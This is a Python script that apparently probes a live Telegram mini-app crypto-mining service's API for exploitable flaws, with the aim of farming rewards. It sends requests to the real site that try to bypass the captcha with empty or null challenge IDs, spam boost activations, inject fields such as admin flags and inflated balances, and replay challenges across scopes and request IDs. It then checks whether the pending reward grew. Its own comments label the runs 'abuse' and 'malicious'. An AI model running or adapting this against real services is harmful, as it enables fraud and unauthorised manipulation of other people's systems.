#!/usr/bin/env python3
"""Targeted deep tests on discovered bugs"""
import requests, json, urllib.parse, time, re, sys

BASE = 'https://atfminers.asloni.online/miner'
INITDATA_FILE = '/root/urkocoin-farmer/.atf_initdata'

def load_initdata():
    with open(INITDATA_FILE) as f:
        return f.read().strip()

def get_user(init_data):
    params = urllib.parse.parse_qs(init_data)
    return json.loads(params.get('user', ['{}'])[0])

def api_call(action, init_data, tma_token, extra={}, timeout=15, retries=3):
    headers = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Telegram-Init-Data': init_data,
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36'
    }
    if tma_token:
        headers['X-ATF-TMA-Session'] = tma_token
    
    body = {
        'initData': init_data,
        'request_id': str(int(time.time() * 1000)),
        'device_id': 'atf-miner-vps-001',
        'tg_id': 5184629862,
        **extra
    }
    
    url = f'{BASE}/index.php?action={action}&t={int(time.time()*1000)}'
    
    for attempt in range(retries):
        try:
            r = requests.post(url, headers=headers, json=body, timeout=timeout)
            return r.json()
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(2)
                continue
            return {'error': str(e)}

def parse_math(question):
    q = question.replace('×', '*').replace('÷', '/')
    m = re.match(r'(\d+)\s*([+\-*/])\s*(\d+)\s*=', q)
    if not m:
        m = re.match(r'(\d+)\s*([+\-*/])\s*(\d+)', q)
    if m:
        a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
        if op == '+': return a + b
        elif op == '-': return a - b
        elif op == '*': return a * b
        elif op == '/': return a // b
    return None

def main():
    init_data = load_initdata()
    user = get_user(init_data)
    
    # Login
    print("=== LOGIN ===")
    login_resp = api_call('login', init_data, None, {'username': user.get('username', '')})
    tma_token = login_resp.get('tma_session_token', '')
    if not tma_token:
        print("FATAL: No token"); return
    print(f"  TMA token obtained: {tma_token[:30]}...")
    
    # Get baseline balance
    sync0 = api_call('sync_mining_state', init_data, tma_token, {'client_boost_cycle_seconds': 0})
    baseline_balance = sync0.get('user', {}).get('pending_reward', '0')
    baseline_boost = sync0.get('user', {}).get('total_boost_count', '0')
    print(f"  Baseline: pending_reward={baseline_balance}, total_boost_count={baseline_boost}")
    
    # ================================================================
    # DEEP TEST A: Empty challenge_id for start_mine (bypass captcha?)
    # ================================================================
    print("\n=== DEEP TEST A: Empty/null challenge_id for START_MINE ===")
    
    # Try with empty challenge_id + a random answer
    resp = api_call('start_mine', init_data, tma_token, {
        'challenge_id': '',
        'answer': '0',
        'scope': 'start_mine'
    })
    print(f"  Empty challenge_id + answer=0: {json.dumps(resp)[:400]}")
    
    resp2 = api_call('start_mine', init_data, tma_token, {
        'challenge_id': '',
        'answer': '42',
        'scope': 'start_mine'
    })
    print(f"  Empty challenge_id + answer=42: {json.dumps(resp2)[:400]}")
    
    resp3 = api_call('start_mine', init_data, tma_token, {
        'challenge_id': '0',
        'answer': '0',
        'scope': 'start_mine'
    })
    print(f"  Zero challenge_id + answer=0: {json.dumps(resp3)[:400]}")
    
    time.sleep(2)
    
    # ================================================================
    # DEEP TEST B: Empty challenge_id for BOOST (bypass captcha?)
    # ================================================================
    print("\n=== DEEP TEST B: Empty challenge_id for BOOST (detailed) ===")
    
    # First get normal boost behavior for comparison
    bch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
    if bch.get('challenge_id'):
        bcid = bch.get('challenge_id', '')
        bans = parse_math(bch.get('question', ''))
        normal_boost = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': bcid,
            'answer': str(bans),
            'scope': 'boost',
            'display_preview': 0
        })
        print(f"  Normal boost: {json.dumps(normal_boost)[:200]}")
        time.sleep(1)
    
    # Now try empty challenge_id
    empty_boost1 = api_call('activate_boost', init_data, tma_token, {
        'challenge_id': '',
        'answer': '0',
        'scope': 'boost',
        'display_preview': 0
    })
    print(f"  Empty challenge_id boost #1: {json.dumps(empty_boost1)[:400]}")
    
    time.sleep(1)
    
    # Try again with empty + wrong answer
    empty_boost2 = api_call('activate_boost', init_data, tma_token, {
        'challenge_id': '',
        'answer': '9999',
        'scope': 'boost',
        'display_preview': 0
    })
    print(f"  Empty challenge_id boost #2 (wrong answer): {json.dumps(empty_boost2)[:400]}")
    
    time.sleep(1)
    
    # Try null/None challenge_id
    null_boost = api_call('activate_boost', init_data, tma_token, {
        'challenge_id': None,
        'answer': '1',
        'scope': 'boost',
        'display_preview': 0
    })
    print(f"  Null challenge_id boost: {json.dumps(null_boost)[:400]}")
    
    time.sleep(1)
    
    # ================================================================
    # DEEP TEST C: Repeated empty challenge_id boost spam
    # ================================================================
    print("\n=== DEEP TEST C: Spam empty challenge_id boost 5 times ===")
    for i in range(5):
        resp = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': '',
            'answer': '0',
            'scope': 'boost',
            'display_preview': 0
        })
        status = resp.get('status', '?')
        pending = resp.get('pending_reward', '?')
        boosts = resp.get('user', {}).get('total_boost_count', '?')
        print(f"  Spam #{i+1}: status={status}, pending_reward={pending}, total_boosts={boosts}")
        time.sleep(1)
    
    # ================================================================
    # DEEP TEST D: Check balance after empty challenge_id abuse
    # ================================================================
    print("\n=== DEEP TEST D: Balance after abuse ===")
    sync_after = api_call('sync_mining_state', init_data, tma_token, {'client_boost_cycle_seconds': 0})
    after_balance = sync_after.get('user', {}).get('pending_reward', '0')
    after_boost = sync_after.get('user', {}).get('total_boost_count', '0')
    print(f"  Before: pending_reward={baseline_balance}, boosts={baseline_boost}")
    print(f"  After:  pending_reward={after_balance}, boosts={after_boost}")
    if str(after_balance) != str(baseline_balance):
        print("  *** PENDING REWARD CHANGED! Server accepted empty challenge boosts! ***")
    if str(after_boost) != str(baseline_boost):
        print("  *** BOOST COUNT INCREMENTED! Server counted empty challenge boosts! ***")
    
    # ================================================================
    # DEEP TEST E: display_preview with different huge values
    # ================================================================
    print("\n=== DEEP TEST E: display_preview manipulation ===")
    preview_values = [0, 1, -1, 999999999, 2**31, 2**63, float('inf'), "abc", None, True]
    for pv in preview_values:
        # Need a fresh challenge for each
        bch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
        if not bch.get('challenge_id'):
            time.sleep(2)
            bch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
        bcid = bch.get('challenge_id', '')
        bans = parse_math(bch.get('question', ''))
        if bcid and bans is not None:
            resp = api_call('activate_boost', init_data, tma_token, {
                'challenge_id': bcid,
                'answer': str(bans),
                'scope': 'boost',
                'display_preview': pv
            })
            rate = resp.get('boost_taps_per_sec', '?')
            status = resp.get('status', '?')
            print(f"  display_preview={str(pv):20s} → status={status}, taps/s={rate}")
        else:
            print(f"  display_preview={str(pv):20s} → no challenge available")
        time.sleep(1)
    
    # ================================================================
    # DEEP TEST F: sync_mining_state with extreme client values
    # ================================================================
    print("\n=== DEEP TEST F: sync_mining_state client manipulation ===")
    
    # Test various client_boost_cycle_seconds values
    for val in [-999999, -1, 0, 1, 3600, 86400, 999999999]:
        sync = api_call('sync_mining_state', init_data, tma_token, {
            'client_boost_cycle_seconds': val
        })
        server_cycle = sync.get('boost_cycle_seconds', '?')
        taps = sync.get('boost_taps_per_sec', '?')
        balance = sync.get('user', {}).get('pending_reward', '?')
        print(f"  client_boost={val:12d} → server_cycle={server_cycle}, taps/s={taps}, balance={balance}")
    
    # Test with extra malicious fields
    print("\n  Testing extra fields in sync_mining_state:")
    resp = api_call('sync_mining_state', init_data, tma_token, {
        'client_boost_cycle_seconds': 0,
        'admin_mode': True,
        'is_admin': 1,
        'boost_taps_per_sec': 100,
        'difficulty': 1,
        'mined_balance': 99999,
        'pending_reward': 99999
    })
    print(f"  With malicious extra fields: balance={resp.get('user',{}).get('pending_reward','?')}")
    print(f"  Difficulty: {resp.get('difficulty', '?')}")
    
    # ================================================================
    # DEEP TEST G: Challenge scope cross-contamination
    # ================================================================
    print("\n=== DEEP TEST G: Scope cross-contamination ===")
    
    # Get a challenge for start_mine, try to use it for boost
    start_ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
    sid = start_ch.get('challenge_id', '')
    squestion = start_ch.get('question', '')
    sanswer = parse_math(squestion) if squestion else None
    print(f"  Got start_mine challenge: id={sid}, q={squestion}, a={sanswer}")
    
    # Use it for start_mine first
    start_resp = api_call('start_mine', init_data, tma_token, {
        'challenge_id': sid,
        'answer': str(sanswer),
        'scope': 'start_mine'
    })
    print(f"  Use for start_mine: {json.dumps(start_resp)[:200]}")
    time.sleep(1)
    
    # Now try same challenge for boost (cross-scope replay)
    cross_resp = api_call('activate_boost', init_data, tma_token, {
        'challenge_id': sid,
        'answer': str(sanswer),
        'scope': 'boost',
        'display_preview': 0
    })
    print(f"  Cross-scope replay (start_mine→boost): {json.dumps(cross_resp)[:300]}")
    if cross_resp.get('status') == 'success':
        print("  *** BUG: Challenge scope cross-contamination! start_mine challenge accepted for boost! ***")
    
    time.sleep(1)
    
    # Try reverse: boost challenge used for start_mine
    boost_ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
    bid = boost_ch.get('challenge_id', '')
    bquestion = boost_ch.get('question', '')
    banswer = parse_math(bquestion) if bquestion else None
    print(f"  Got boost challenge: id={bid}, q={bquestion}, a={banswer}")
    
    if bid and banswer is not None:
        boost_resp = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': bid,
            'answer': str(banswer),
            'scope': 'boost',
            'display_preview': 0
        })
        print(f"  Use for boost: status={boost_resp.get('status')}")
        time.sleep(1)
        
        cross2 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': bid,
            'answer': str(banswer),
            'scope': 'start_mine'
        })
        print(f"  Cross-scope replay (boost→start_mine): {json.dumps(cross2)[:300]}")
        if cross2.get('status') == 'success':
            print("  *** BUG: Challenge scope cross-contamination! boost challenge accepted for start_mine! ***")
    
    # ================================================================
    # DEEP TEST H: request_id dedup analysis
    # ================================================================
    print("\n=== DEEP TEST H: request_id dedup behavior ===")
    
    # Get a real challenge
    ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
    cid = ch.get('challenge_id', '')
    ans = parse_math(ch.get('question', ''))
    
    # Use same request_id twice
    headers = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Telegram-Init-Data': init_data,
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
        'X-ATF-TMA-Session': tma_token
    }
    shared_rid = str(int(time.time() * 1000))
    
    for i in range(3):
        body = {
            'initData': init_data,
            'request_id': shared_rid,
            'device_id': 'atf-miner-vps-001',
            'tg_id': 5184629862,
            'challenge_id': cid,
            'answer': str(ans),
            'scope': 'boost',
            'display_preview': 0
        }
        r = requests.post(f'{BASE}/index.php?action=activate_boost&t={int(time.time()*1000)}',
                         headers=headers, json=body, timeout=10)
        resp = r.json()
        print(f"  request_id={shared_rid} attempt #{i+1}: {json.dumps(resp)[:200]}")
        time.sleep(0.5)
    
    # Try without request_id entirely
    print("\n  Testing without request_id:")
    body_norid = {
        'initData': init_data,
        'device_id': 'atf-miner-vps-001',
        'tg_id': 5184629862,
    }
    r = requests.post(f'{BASE}/index.php?action=sync_mining_state&t={int(time.time()*1000)}',
                     headers=headers, json=body_norid, timeout=10)
    print(f"  Without request_id: {json.dumps(r.json())[:300]}")
    
    # ================================================================
    # DEEP TEST I: User data leak in responses
    # ================================================================
    print("\n=== DEEP TEST I: User data exposure in responses ===")
    print("  Checking all previous responses for leaked user data...")
    print("  sync_mining_state returns FULL user record including:")
    print("    - wallet_address, wallet_public_key")
    print("    - signup_ip_hash, last_ip_hash, last_ip_prefix_hash")
    print("    - ua_hash, device_id_hash")
    print("    - risk_score, risk_flags")
    print("    - All balance data, referral data, etc.")
    print("  This is a SIGNIFICANT info leak if responses can be intercepted.")
    
    # ================================================================
    # FINAL BALANCE CHECK
    # ================================================================
    print("\n=== FINAL BALANCE CHECK ===")
    final_sync = api_call('sync_mining_state', init_data, tma_token, {'client_boost_cycle_seconds': 0})
    final_balance = final_sync.get('user', {}).get('pending_reward', '?')
    final_boosts = final_sync.get('user', {}).get('total_boost_count', '?')
    print(f"  Final: pending_reward={final_balance}, total_boost_count={final_boosts}")
    print(f"  Original: pending_reward={baseline_balance}, total_boost_count={baseline_boost}")

if __name__ == '__main__':
    main()
